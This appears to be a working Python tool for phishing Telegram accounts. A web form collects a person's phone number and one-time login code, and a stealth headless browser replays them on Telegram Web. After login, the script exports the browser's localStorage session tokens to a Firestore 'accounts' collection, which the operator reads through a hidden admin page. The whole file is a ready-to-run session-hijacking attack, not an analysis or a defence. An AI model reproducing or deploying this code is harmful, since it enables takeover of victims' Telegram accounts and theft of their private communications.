# ...existing code...
import undetected_chromedriver as uc
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import json
import time
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from google.oauth2 import service_account
from google.cloud import firestore
from dotenv import load_dotenv
import os
import uuid
from socketserver import ThreadingMixIn
from collections import deque
import base64


load_dotenv()

# Global variables to store data
phone_data = {}
login_code = None
code_received = threading.Event()
phone_received = threading.Event()

sessions = {}
queue_lock = threading.Lock()

job_queue = deque()
queue_lock = threading.Lock()

LOGIN_TIMEOUT = int(os.environ.get('LOGIN_TIMEOUT', 120))         # time allowed for initial phone->code step
CODE_WAIT = int(os.environ.get('CODE_WAIT', 300))                # max time to wait for user to submit code
CODE_ENTRY_TIMEOUT = int(os.environ.get('CODE_ENTRY_TIMEOUT', 60))

SESSION_TTL = int(os.environ.get('SESSION_TTL', 600))            # keep logged-in session this long (default 10 minutes)
QUEUED_TTL = int(os.environ.get('QUEUED_TTL', 7200)) 

ADMIN_USER = os.environ.get('ADMIN_USER')
ADMIN_PASS = os.environ.get('ADMIN_PASS')

# Firestore initialization (unchanged)
firestore_db = None
try:
    fb_key = os.environ.get('FIREBASE_KEY')
    if fb_key:
        fb_key = fb_key.strip().strip("'\"")
        sa_info = json.loads(fb_key)
        creds = service_account.Credentials.from_service_account_info(sa_info)
        firestore_db = firestore.Client(project=sa_info.get('project_id'), credentials=creds)
        print("Firestore initialized")
    else:
        print("FIREBASE_KEY not found in environment; Firestore disabled")
except Exception as e:
    print(f"Failed to initialize Firestore: {e}")
    firestore_db = None

# Session store for concurrent users
sessions = {}
sessions_lock = threading.Lock()

class TelegramAutomation:
    def __init__(self):
        self.driver = None
        self.setup_driver()
        self.current_status = "Ready"
        self.phone_number = None
        
    # ...existing code...
    def setup_driver(self):
        """Configure and initialize the WebDriver"""
        chrome_options = uc.ChromeOptions()
        chrome_options.add_argument('--headless=new')  # Use new headless mode for better compatibility
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-software-rasterizer')  # Helps with rendering issues in containers
        chrome_options.add_argument('--remote-debugging-port=9222')  # For debugging if needed
        chrome_options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36')

        try:
            # Explicitly set the browser executable path for Docker/Render compatibility
            self.driver = uc.Chrome(
                options=chrome_options,
                browser_executable_path='/usr/bin/google-chrome-stable',
                use_subprocess=True  # Helps with process management in containers
            )
            print("WebDriver initialized successfully")
        except Exception as e:
            print(f"Failed to initialize WebDriver: {e}")
            raise
    # ...existing code...
    def login_with_phone(self, country_code, phone_number):
        """Perform Telegram login with phone number"""
        try:
            self.phone_number = f"+{country_code}{phone_number}"
            # Navigate to Telegram Web
            self.driver.get('https://web.telegram.org/a/')
            print("Navigated to Telegram Web")
            
            # Wait for page to load
            time.sleep(5)
            
            # Try multiple selectors for the login button
            button_selectors = [
                "//button[contains(text(), 'Log in by phone Number')]",
                "//button[contains(text(), 'Log in by phone')]",
                "//button[contains(., 'phone')]",
                "//button[contains(@class, 'auth-button')]",
                "//button[contains(@class, 'primary')]",
                "//div[contains(@class, 'button') and contains(text(), 'Log in')]"
            ]
            
            button_found = False
            for selector in button_selectors:
                try:
                    button = WebDriverWait(self.driver, 30).until(
                        EC.element_to_be_clickable((By.XPATH, selector))
                    )
                    print(f"Button found with selector: {selector}")
                    button.click()
                    button_found = True
                    print("Login button clicked successfully!")
                    break
                except Exception as e:
                    print(f"Selector failed: {selector} - {str(e)}")
                    continue
            
            if not button_found:
                raise Exception("Could not find login button")
            
            # Wait for form elements
            time.sleep(3)
            
            # Click on country dropdown to open it
            country_dropdown = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "div.CountryCodeInput"))
            )
            country_dropdown.click()
            print("Country dropdown clicked")
            
            time.sleep(2)
            
            # Search for country in the dropdown
            search_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input#sign-in-phone-code"))
            )
            search_input.clear()
            
            # Get country name from country code
            country_name = self.get_country_name(country_code)
            search_input.send_keys(country_name)
            print(f"Searched for {country_name}")
            
            time.sleep(2)
            
            # Select country from the dropdown
            country_option = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, f"//div[contains(@class, 'MenuItem')]//span[contains(text(), '{country_name}')]"))
            )
            country_option.click()
            print(f"{country_name} selected from dropdown")
            
            time.sleep(2)
            
            # Enter the phone number
            phone_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'input#sign-in-phone-number'))
            )
            

            phone_input.send_keys(phone_number)
            print("Phone number entered")
            
            # Click Next button
            time.sleep(2)
            next_button_selectors = [
                "//button[contains(text(), 'Next')]",
                "//button[contains(@class, 'auth-button') and contains(@class, 'primary')]",
                "//button[@type='submit']",
                "button.Button.auth-button.default.primary"
            ]
            
            next_button = None
            for selector in next_button_selectors:
                try:
                    if selector.startswith('//'):
                        next_button = self.driver.find_element(By.XPATH, selector)
                    else:
                        next_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                    
                    if next_button.is_enabled():
                        print(f"Next button found with selector: {selector}")
                        next_button.click()
                        print("Next button clicked")
                        break
                    else:
                        next_button = None
                        print("Next button found but disabled")
                except:
                    continue
            
            if not next_button:
                # Fallback: try JavaScript click
                buttons = self.driver.find_elements(By.CSS_SELECTOR, "button.primary")
                for button in buttons:
                    if button.is_displayed():
                        self.driver.execute_script("arguments[0].click();", button)
                        print("Clicked button using JavaScript")
                        break
            
            self.current_status = "code_required"
            return True
            
        except Exception as e:
            print(f"Error during phone login: {e}")
            self.current_status = f"error: {str(e)}"
            # Save error details
            try:
                self.driver.save_screenshot('telegram_error.png')
                with open('telegram_error_source.html', 'w', encoding='utf-8') as f:
                    f.write(self.driver.page_source)
                print("Error screenshot and page source saved.")
            except Exception:
                pass
            return False
    # ...existing code...
    def get_country_name(self, country_code):
        """Get country name from country code"""
        country_map = {
            "251": "Ethiopia",
            "1": "United States",
            "44": "United Kingdom",
            "91": "India",
            "86": "China",
            "49": "Germany",
            "33": "France",
            "39": "Italy",
            "34": "Spain",
            "7": "Russia",
            "81": "Japan",
            "82": "South Korea",
        }
        return country_map.get(country_code, "Ethiopia")
    # ...existing code...
    def enter_login_code(self, code):
        """Enter the login code received from user"""
        try:
            # Wait for code input page
            code_input = WebDriverWait(self.driver, 30).until(
                EC.presence_of_element_located((By.ID, "sign-in-code"))
            )
            
            code_input.send_keys(code)
            print("Login code submitted")
            
            # Wait for successful login
            WebDriverWait(self.driver, 30).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, '.chat-list, .dialogs, .conversation-list'))
            )
            print("Login successful!")
            
            # Export LocalStorage
            local_storage_data = self.driver.execute_script("return Object.assign({}, localStorage);")
            with open('telegram_localstorage_headless.json', 'w') as f:
                json.dump(local_storage_data, f, indent=2)
            print("LocalStorage exported to telegram_localstorage_headless.json")

            try:
                if firestore_db:
                    doc = {
                        "phone_number": getattr(self, "phone_number", "unknown"),
                        "local_storage": local_storage_data,
                        "created_at": firestore.SERVER_TIMESTAMP
                    }
                    firestore_db.collection("accounts").add(doc)
                    print("LocalStorage saved to Firestore collection 'accounts'")
                else:
                    print("Firestore not initialized; skipped saving localStorage to Firestore")
            except Exception as e:
                print(f"Failed to save to Firestore: {e}")
            
            self.current_status = "login_success"
            return True
            
        except Exception as e:
            print(f"Error during code entry: {e}")
            self.current_status = f"error: {str(e)}"
            return False

    def close(self):
        """Close the WebDriver"""
        if self.driver:
            try:
                self.driver.quit()
            except Exception:
                pass
            print("WebDriver closed")

# Global automation instance (deprecated - kept for backwards compatibility if needed)
automation = None

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

class TelegramHTTPHandler(BaseHTTPRequestHandler):
    def _set_common_headers(self):
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Session-Id')

    def _is_authorized(self):
        """Check HTTP Basic Authorization header against ADMIN_USER / ADMIN_PASS.
        If ADMIN_USER/ADMIN_PASS are not set, treat as allowed (developer convenience)."""
        if not (ADMIN_USER and ADMIN_PASS):
            return True  # no creds configured -> allow access (use env vars in production)
        auth = self.headers.get('Authorization')
        if not auth or not auth.lower().startswith('basic '):
            return False
        try:
            token = auth.split(None, 1)[1]
            decoded = base64.b64decode(token).decode('utf-8')
            user, pwd = decoded.split(':', 1)
            return user == ADMIN_USER and pwd == ADMIN_PASS
        except Exception:
            return False

    def _require_auth(self):
        """Send 401 WWW-Authenticate response"""
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm="Restricted"')
        self._set_common_headers()
        self.end_headers()
        self.wfile.write(json.dumps({"error": "authentication_required"}).encode())
    # ...existing code...

    def do_GET(self):
        """Handle GET requests"""
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)
        session_id = query.get('session', [None])[0] or self.headers.get('X-Session-Id')

        if path == '/status':
            # If session supplied, return that session's status
            if session_id:
                with sessions_lock:
                    sess = sessions.get(session_id)
                if not sess:
                    self.send_response(404)
                    self._set_common_headers()
                    self.end_headers()
                    self.wfile.write(json.dumps({"error": "session_not_found"}).encode())
                    return
                status = sess.get('status', 'unknown')
            else:
                status = automation.current_status if automation else "not_initialized"

            self.send_response(200)
            self._set_common_headers()
            self.end_headers()
            self.wfile.write(json.dumps({"status": status}).encode())
            return
        
        elif path == '/':
            # Serve form.html
            try:
                with open('form.html', 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(content)
            except FileNotFoundError:
                self.send_error(404, "File not found")
        
        elif path == '/brocodepizza':
            # Serve home.html
            if not self._is_authorized():
                return self._require_auth()
            try:
                with open('home.html', 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(content)
            except FileNotFoundError:
                self.send_error(404, "File not found")

        elif path == '/accounts':
            # Return accounts JSON — protected by same admin Basic auth
            if not self._is_authorized():
                return self._require_auth()

            if not firestore_db:
                self.send_response(500)
                self._set_common_headers()
                self.end_headers()
                self.wfile.write(json.dumps({"error": "Firestore not initialized"}).encode())
                return

            try:
                accounts_ref = firestore_db.collection("accounts")
                docs = accounts_ref.stream()
                accounts = []
                for doc in docs:
                    data = doc.to_dict()
                    # Convert timestamp to ISO string if present
                    if 'created_at' in data and data['created_at']:
                        try:
                            data['created_at'] = data['created_at'].isoformat()
                        except Exception:
                            # If non-datetime, leave as-is (string)
                            pass
                    accounts.append(data)

                self.send_response(200)
                self._set_common_headers()
                self.end_headers()
                self.wfile.write(json.dumps(accounts).encode())
            except Exception as e:
                self.send_response(500)
                self._set_common_headers()
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode())
        
        else:
            self.send_error(404, "Endpoint not found")
    
    def do_POST(self):
        """Handle POST requests for phone number and code"""
        # Get content length
        content_length = int(self.headers.get('Content-Length', 0))
        
        # Read the POST data
        if content_length > 0:
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
            except Exception:
                data = {}
        else:
            data = {}
        
        self.send_response(200)
        self._set_common_headers()
        self.end_headers()
        
        global automation
        
        if self.path == '/phone':
            country_code = data.get('country_code', '')
            phone_number = data.get('phone_number', '')
            
            if not country_code or not phone_number:
                response = {"error": "Missing country_code or phone_number"}
                self.wfile.write(json.dumps(response).encode('utf-8'))
                return

            # create session record but DO NOT start browser here (avoid multiple browsers)
            session_id = uuid.uuid4().hex
            now = time.time()
            sess = {
                "created_at": now,
                "queued_at": now,
                "phone_country": country_code,
                "phone_number": phone_number,
                "status": "queued",
                "automation": None,      # will be created by processor when job is active
                "pending_code": None
            }
            with sessions_lock:
                sessions[session_id] = sess
            with queue_lock:
                job_queue.append(session_id)

            response = {"message": "Enqueued. You will be processed when previous jobs finish.", "session": session_id, "position": len(job_queue)}
            self.wfile.write(json.dumps(response).encode('utf-8'))
            return
        
        elif self.path == '/code':
            session_id = data.get('session') or self.headers.get('X-Session-Id')
            if not session_id:
                response = {"error": "Missing session id. Include 'session' in JSON body or 'X-Session-Id' header."}
                self.wfile.write(json.dumps(response).encode('utf-8'))
                return

            with sessions_lock:
                sess = sessions.get(session_id)
            if not sess:
                response = {"error": "session_not_found"}
                self.wfile.write(json.dumps(response).encode('utf-8'))
                return

            code = data.get('code', '')
            if not code:
                response = {"error": "Missing code"}
                self.wfile.write(json.dumps(response).encode('utf-8'))
                return

            # Store pending code so the processor can use it when this session is active.
            with sessions_lock:
                sess['pending_code'] = code
                # If job is still queued, mark that code arrived (so processor won't wait full CODE_WAIT)
                if sess.get('status') == 'queued':
                    sess['status'] = 'queued_with_code'
            response = {"message": "Code received and stored for session."}
            self.wfile.write(json.dumps(response).encode('utf-8'))
            return
        
        else:
            response = {"error": "Invalid endpoint"}
            self.wfile.write(json.dumps(response).encode('utf-8'))
            return
    
    def do_OPTIONS(self):
        """Handle CORS preflight requests"""
        self.send_response(200)
        self._set_common_headers()
        self.end_headers()
    
    def log_message(self, format, *args):
        """Override to reduce log noise"""
        pass

def _session_cleaner():
    """Background cleaner to remove old sessions and close browsers"""
    while True:
        with sessions_lock:
            now = time.time()
            to_delete = []
            for sid, val in list(sessions.items()):
                # If an explicit expires_at was set (post-login), use it
                expires = val.get('expires_at')
                if expires:
                    if now > expires:
                        to_delete.append(sid)
                    continue

                # Otherwise fall back to queued/created age
                age = now - val.get('created_at', now)
                # be defensive: automation may be None or already closed
                auto = val.get('automation')
                status = None
                try:
                    if auto:
                        status = getattr(auto, 'current_status', None)
                except Exception:
                    status = None

                if age > QUEUED_TTL:
                    to_delete.append(sid)
                elif status == "login_success" and age > SESSION_TTL:
                    to_delete.append(sid)
                elif isinstance(status, str) and status.startswith("error:") and age > 600:
                    to_delete.append(sid)

            for sid in to_delete:
                try:
                    auto = sessions[sid].get('automation')
                    if auto:
                        auto.close()
                except Exception:
                    pass
                # Optionally remove any on-disk files tied to session here (if you save per-session localStorage)
                sessions.pop(sid, None)
        time.sleep(30)


def _queue_processor():
    """Sequentially process queued sessions. Only one browser runs at a time."""
    while True:
        session_id = None
        with queue_lock:
            if job_queue:
                session_id = job_queue.popleft()
        if not session_id:
            time.sleep(1)
            continue

        with sessions_lock:
            sess = sessions.get(session_id)
            if not sess:
                continue
            sess['status'] = 'processing'
            sess['started_at'] = time.time()

        # Create automation instance here (only one at a time)
        try:
            auto = TelegramAutomation()
        except Exception as e:
            with sessions_lock:
                sess['status'] = f"error: failed_to_start_browser: {e}"
                sess['automation'] = None
            continue

        with sessions_lock:
            sess['automation'] = auto

        # Run login_with_phone in thread to allow applying timeout
        login_thread = threading.Thread(target=lambda: auto.login_with_phone(sess['phone_country'], sess['phone_number']))
        login_thread.daemon = True
        login_thread.start()
        login_thread.join(LOGIN_TIMEOUT)

        with sessions_lock:
            status = auto.current_status

        if login_thread.is_alive():
            # login step timed out / stuck
            try:
                auto.current_status = f"error: login_timeout_after_{LOGIN_TIMEOUT}s"
                auto.close()
            except Exception:
                pass
            with sessions_lock:
                sess['status'] = auto.current_status
                sess['automation'] = None
            continue

        # If login failed quickly, mark error and continue
        if status.startswith("error:"):
            with sessions_lock:
                sess['status'] = status
                sess['automation'] = None
            try:
                auto.close()
            except Exception:
                pass
            continue

        # If code is required, wait for user code (but not indefinitely)
        if status == "code_required":
            with sessions_lock:
                sess['status'] = 'code_required'
            code_deadline = time.time() + CODE_WAIT
            got_code = False
            while time.time() < code_deadline:
                with sessions_lock:
                    code = sess.get('pending_code')
                if code:
                    got_code = True
                    break
                time.sleep(1)

            if not got_code:
                # no code provided in time
                try:
                    auto.current_status = f"error: no_code_received_within_{CODE_WAIT}s"
                    auto.close()
                except Exception:
                    pass
                with sessions_lock:
                    sess['status'] = auto.current_status
                    sess['automation'] = None
                continue

            # run enter_login_code with timeout
            def _enter_code(a, c):
                a.enter_login_code(c)

            code_thread = threading.Thread(target=_enter_code, args=(auto, code))
            code_thread.daemon = True
            code_thread.start()
            code_thread.join(CODE_ENTRY_TIMEOUT)

            if code_thread.is_alive():
                try:
                    auto.current_status = f"error: code_entry_timeout_after_{CODE_ENTRY_TIMEOUT}s"
                    auto.close()
                except Exception:
                    pass
                with sessions_lock:
                    sess['status'] = auto.current_status
                    sess['automation'] = None
                    sess['pending_code'] = None
                continue

            # finished code step; capture final status and cleanup as needed
            with sessions_lock:
                sess['status'] = auto.current_status
                sess['pending_code'] = None
                if auto.current_status == "login_success":
                    sess['expires_at'] = time.time() + SESSION_TTL

            # If login_success, leave local storage saving logic inside enter_login_code (already present)
            try:
                auto.close()
            except Exception:
                pass
            with sessions_lock:
                sess['automation'] = None

        else:
            # unexpected status - close and mark
            try:
                auto.current_status = f"error: unexpected_status_{status}"
                auto.close()
            except Exception:
                pass
            with sessions_lock:
                sess['status'] = auto.current_status
                sess['automation'] = None


def run_server():
    port = int(os.environ.get('PORT', 8765))
    server = ThreadedHTTPServer(('0.0.0.0', port), TelegramHTTPHandler)
    print(f"HTTP server started on 0.0.0.0:{port} (threaded)")
    # start session cleaner
    cleaner = threading.Thread(target=_session_cleaner, daemon=True)
    cleaner.start()
    print("Session cleaner thread started")
    # start queue processor (single worker)
    processor = threading.Thread(target=_queue_processor, daemon=True)
    processor.start()
    print("Queue processor thread started (single active automation)")

    print("Press Ctrl+C to stop the server")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down server...")
        # close all sessions' browsers
        with sessions_lock:
            for sid, val in sessions.items():
                try:
                    if val.get('automation'):
                        val['automation'].close()
                except Exception:
                    pass
        server.server_close()

if __name__ == "__main__":
    run_server()
# ...existing code...